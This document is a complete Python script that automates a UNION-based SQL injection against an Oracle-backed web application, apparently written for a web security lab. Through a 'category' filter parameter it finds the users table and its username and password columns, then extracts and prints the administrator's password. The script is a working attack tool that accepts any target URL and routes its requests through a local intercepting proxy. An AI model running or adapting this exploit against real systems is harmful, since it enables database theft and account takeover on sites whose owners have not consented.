import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

# Disable SSL/TLS warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure proxy settings if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def p_request(url, sql_payload):
    path = '/filter?category=Pets'
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text

def sql_users_table(url):
    sql_payload = "' UNION SELECT table_name,NULL FROM all_tables--"
    res = p_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(string=re.compile('^USERS\_.*'))
    if users_table:
        return users_table
    else:
        return False

def sql_users_columun(url, users_table):
    sql_payload = "' UNION  SELECT column_name, NULL  FROM  all_tab_columns WHERE table_name ='%s' --"%users_table
    res = p_request(url,sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(string=re.compile('.*USERNAME.*'))
    password_column = soup.find(string=re.compile('.*PASSWORD.*'))
    return username_column, password_column

def sqli_admin_cred(url, users_table, username_column, password_column):
    sql_payload="' UNION SELECT  %s, %s FROM  %s--"%(username_column, password_column, users_table)
    res = p_request(url,sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.body.find(string="administrator").parent.find_next('td').contents[0]
    return admin_password

if __name__ == "__main__":
    try:
        url =sys.argv[1].strip()
    
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] For Example: %s http://www.random.com" % sys.argv[0])
        sys.exit(-1)
    print("Table looking.................")
    users_table = sql_users_table(url)
    if users_table:
        print("Search............  table name:%s" %users_table)
        username_column, password_column = sql_users_columun(url, users_table)
        if username_column and password_column:
            print("username column: %s "%username_column)
            print("password column: %s "%password_column)

            admin_password = sqli_admin_cred(url,users_table,username_column,password_column)
            if admin_password:
                print("[+] admin password  : %s" %admin_password)
            else:
                print("[-] admin password bulunamadı")
        else:
            print("[-] columuns bulunamadı")
    else:
            print("[-] table bulunamadı")


    
